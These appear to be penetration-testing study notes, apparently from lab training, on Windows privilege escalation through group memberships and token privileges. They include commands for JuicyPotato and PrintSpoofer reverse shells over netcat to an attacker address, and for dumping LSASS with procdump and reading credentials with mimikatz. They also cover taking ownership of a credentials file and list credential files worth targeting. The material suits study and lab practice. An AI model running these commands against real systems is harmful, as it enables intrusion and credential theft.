# Windows Privilegs Overview
[Privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges)

### Windows Authorization Process
[Security Identifier(SID)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows)

[Access Control Entries (ACEs)](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries)

[Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)

### Rights and Privileges in Windows
Default Administrators
* Domain Admins and Enterprise Admins are "super" groups.

Server Operators
* Members can modify services, access SMB shares, and backup files

Backup Operators
* Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.

Print Operators
* Members can log on to DCs locally and "trick" Windows into loading a malicious driver.

Hyper-V Administrators
* If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.

Account Operators
* Members can modify non-protected accounts and groups in the domain.

Remote Desktop Users
* Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
Remote Management Users	Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs)

Group Policy Creator Owners
* Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.

Schema Admins
* Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.

DNS Admins
* Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.


| Setting Constant| Standard Assignment| Description |
|-|-|-|
| SeNetworkLogonRight | Administrators, Authenticated Users | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+. |
| SeRemoteInteractiveLogonRight | Administrators, Remote Desktop Users | This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server. |
| SeBackupPrivilege | Administrators | 	This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system. |
| SeSecurityPrivilege | Administrators | 	This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|
| SeTakeOwnershipPrivilege | Administrators | This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads. |
| SeDebugPrivilege | Administrators | This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components. |
| SeImpersonatePrivilege | Administrators, Local Service, Network Service, Service | This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user. |
| SeLoadDriverPrivilege | Administrators | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code. |
| SeRestorePrivilege | Administrators | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object. |
| SeTcbPrivilege | Administrators, Local Service, Network Service, Service | This security setting determines whether a process can assume the identity of any user and, through this, obtain access to resources that the targeted user is permitted to access (impersonation). This may be assigned to antivirus or backup tools that need the ability to access all system files for scans or backups. This privilege should be reserved for service accounts requiring this access for legitimate activities. |

### Local Admin User Rights - Elevated
`whoami`

`whoami /priv`

# SeImpersonate and SeAssignPrimiaryToken
To utilize the token, the SeImpersonate privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening. An example of using this token would be [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

### Impacket-mssqlclient.py (SeImpersonatePrivilege)
[JuicyPotato](https://github.com/ohpe/juicy-potato)
```SQL
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

sudo nc -lnvp 8443
```

# PrintSpoofer and RougePotato
[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RougePotato](https://github.com/antonioCoco/RoguePotato)

```SQL
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
nc -lnvp 8443
```

# SeDebugPrivilege
Where to find the settings:

`Computer Settings > Windows Settings > Security Settings.`

`User Rights Assignment > Debug Programs`

### Using the command line
[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
If RDP'd into a system, can go to the task manager and find the lsass.exe and make a dump file to move back to the kali machine for evidence.

### Remote Code Execution

We can also leverage SeDebugPrivilege for RCE. Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it. 
First, transfer this [PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) script over to the target system. Next we just load the script and run it with the following syntax `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,c:\Windows\System32\cmd.exe","")`. Note that we must add a third blank argument "" at the end for the PoC to work properly.

To get the pid, run a `tasklist` command.

# SeTakeOwnershipPrivilege
It may also be assigned a few others such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` to control this account's privileges at a more granular level and not granting the account full local admin rights.
The setting can be set in Group Policy under: `Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment`.
With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

### PoCs
[script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell
whoami /priv

Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv

# Getting a file to confirm ownership
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Checking the ownership
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Now using [This](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown)Windows binary file.
```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Confirming the changes
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

### Modifying the File ACL
```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'

# Granting access
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
cat 'C:\Department Shares\Private\IT\cred.txt'
```

### When to use
#### Files of Interest

Some local files of interest may include:

```shellsession
c:\inetpub\wwwwroot\web.config %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav`

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
```
